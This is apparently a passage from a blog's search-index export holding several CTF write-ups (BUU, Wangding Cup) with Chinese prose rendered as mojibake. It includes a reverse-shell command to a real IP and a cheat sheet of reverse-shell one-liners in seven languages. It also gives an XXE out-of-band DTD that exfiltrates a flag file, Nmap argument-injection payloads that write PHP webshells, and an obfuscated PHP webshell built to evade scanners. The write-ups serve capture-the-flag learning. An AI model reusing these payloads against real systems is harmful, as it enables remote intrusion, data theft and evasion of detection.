class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>



<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦å»æ‹¿åˆ°keyï¼Œç›´æ¥è¯»å–/tmp/secret.txtä¼šè¯»å–ä¸åˆ°ï¼Œå› ä¸ºå·²ç»è¢«åˆ æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥å»å°è¯•è¯»å–/proc/self/fd/3ï¼Œç»“æœè¿˜æ˜¯å‡ºä¸æ¥ï¼Œè¿™ä¸‹å°±åªèƒ½çˆ†ç ´äº†ã€‚ã€‚ã€‚çœ‹çœ‹å›æ˜¾é•¿åº¦æ˜æ˜¾ä¸å¯¹çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://ab2b25bc-4b91-4cdd-8783-c166e7d6ebae.node3.buuoj.cn/page?url=../../../../../../proc/&#123;&#125;/fd/3&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url=url).text</span><br><span class="line">    print(<span class="built_in">len</span>(res),<span class="string">&quot;æ­¤æ—¶iä¸º&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘å¾—è¿›ç¨‹æ˜¯14ï¼Œçˆ†ç ´å¾—åˆ°</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">yoKTwnWJilxVJnoa8y9HwwAAagZ7aKs0MGPKhMbjYWA=</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶åªèƒ½æ‰§è¡Œos.system,ç›´æ¥åå¼¹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¼¹è¿‡å»å°±æ‹¿åˆ°shelläº†</p>
<p><img src="image-20201216163429545.png" alt="image-20201216163429545"></p>
<p>è¿™é‡Œé¡ºä¾¿æŠŠå„ç§è¯­è¨€ä¸€å¥è¯åå¼¹shellè®°å½•åœ¨æ­¤ï¼š</p>
<p>python:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>perl:</p>
<p>1</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>2</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Ruby</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Lua</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;5555&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>AWK</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯fileJava</title>
    <url>/2020/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AFfileJava/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>Java æ–‡ä»¶æ³„éœ²</li>
<li>XXE</li>
</ul>
<p>åšé¢˜æ€è·¯ï¼š</p>
<p>å¼€å±€å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸‹è½½çš„æ—¶å€™å¯ä»¥æ–‡ä»¶æ³„éœ²</p>
<p><img src="image-20201217125640279.png" alt="image-20201217125640279"></p>
<p>è¿™æ ·çš„è¯å°±å¯ä»¥æ‰¾åˆ°ä¸‰ä¸ªJavaæ–‡ä»¶ï¼Œåˆ†åˆ«dumpæºç ï¼Œåœ¨æ–‡ä»¶ä¸­ä½œè€…ç»™å‡ºäº†æç¤º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">String filename;</span><br><span class="line">String fileExtName;</span><br><span class="line"><span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">    filename = fileItem.getFieldName();</span><br><span class="line">    fileExtName = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    filename = fileItem.getName();</span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                System.out.println(sheet.getFirstRowNum());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                var20.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>æ•…æ‰¾åˆ°è¿™ä¸ªCVEï¼š</p>
<p><a href="https://blog.csdn.net/weixin_42296449/article/details/88934150">https://blog.csdn.net/weixin_42296449/article/details/88934150</a></p>
<p>å…ˆå†™ä¸€ä¸ªç¬¦åˆæ­£åˆ™çš„çš„ç”¨æˆ·åevcel-xxx.xlsx,å°†å…¶åç¼€ä¿®æ”¹ä¸ºzipï¼ŒåŠ ä¸ŠPOCä¹‹åå†ä¿®æ”¹å›å»ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://0.0.0.0/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20201217130933478.png" alt="image-20201217130933478"></p>
<p>åœ¨åå°„è¿‡å»çš„æœºå­ä¸Šé¢å†™ä¸€ä¸ª1.dtdï¼Œä»¤å…¶è¿œç¨‹å®ä½“è°ƒç”¨</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;0.0.0.0?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>éšåä¸Šä¼ æ–‡ä»¶å³å¯ï¼š</p>
<p><img src="image-20201217131243814.png" alt="image-20201217131243814"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>Java</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯æœ±é›€ç»„Nmap</title>
    <url>/2020/12/16/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84Nmap/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h1><ul>
<li>NMAP ç»„ä»¶</li>
<li>PHP çŸ­æ ‡ç­¾ç»•è¿‡</li>
</ul>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>é¢˜ç›®ç±»ä¼¼BUUæ›¾ç»çš„é¢˜ç›®Online Tool</p>
<p>æ­¤å¤„ä½¿ç”¨systemå‡½æ•°ï¼Œåº”è¯¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œnmapå‚æ•°ä¸­ -oGå¯ä»¥è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Œæ­¤å¤„æˆ‘ä»¬å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæœ€åpayloadä¸º</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å†™å…¥PHPè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç»•è¿‡ä¸€ä¸‹å°±è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host&#x3D; &#39; &lt;?&#x3D;&#96;$_POST[0]&#96; ;?&gt; -oG 1.phtml &#39;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€äº›è¿‡ç‹—é©¬</title>
    <url>/2020/12/14/%E4%B8%80%E4%BA%9B%E8%BF%87%E7%8B%97%E9%A9%AC/</url>
    <content><![CDATA[<p>å†™è¿™ç¯‡çš„åŸå› ä¸»è¦æ˜¯ä¸€æ¬¡å¯¹å†…çš„AWDè‡ªå·±è¢«ä¸€ä¸ªè¿‡ç‹—é©¬çš„æ–¹å¼å¡ä½äº†ï¼Œæƒ³äº†åŠå¤©æ‰æŠ˜è…¾å‡ºæ¥ï¼Œæ‰€ä»¥æ‰“ç®—æ€»ç»“ä¸€ä¸‹å„ç§è¿‡ç‹—é©¬çš„å§¿åŠ¿ã€‚</p>
<p>åœ¨å„ç¯‡AWDæ¯”èµ›ä¸­æ€»ä¼šæ•™æˆ‘ä»¬èµ·æ‰‹å¼å°±æ˜¯æŠŠåŸä»¶è„±ä¸‹æ¥å¤‡ä»½ï¼Œä¹‹åå°±æ˜¯ç”¨Dç›¾æ‰«ã€‚è€ŒDç›¾è¿™ä¸ªä¸œè¥¿å¯¹äºä»£ç çš„è¯†åˆ«å¾ˆå¤šæ—¶å€™ä¹Ÿå°±æ˜¯å±€é™äºå¯¹ä¸€äº›å‡½æ•°çš„æ­£åˆ™åŒ¹é…ã€‚æ‰€ä»¥æˆ‘ä»¬ç»•è¿‡éœ€è¦æ³¨æ„å‡ ç‚¹å³å¯ï¼š</p>
<ul>
<li>å¯¹äºevalï¼Œcall_backå‡½æ•°æ˜¯ä¸èƒ½ç”¨çš„</li>
<li>å°è¯•ä½¿ç”¨ä¸€äº›ç½•è§çš„call backå‡½æ•°</li>
</ul>
<p>è®°å½•ä¸€ä¸ªå‚»é€¼ç©æ„å„¿ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~åŒº[$__].~å†ˆ[$__].~åŒº[$__].~å‹º[$__].~çš®[$__].~é’ˆ[$__];$____=~ç [$__].~å¯¸[$__].~å°[$__].~æ¬ [$__].~ç«‹[$__];$___($$____[_]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç æ˜¯_</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
</search>
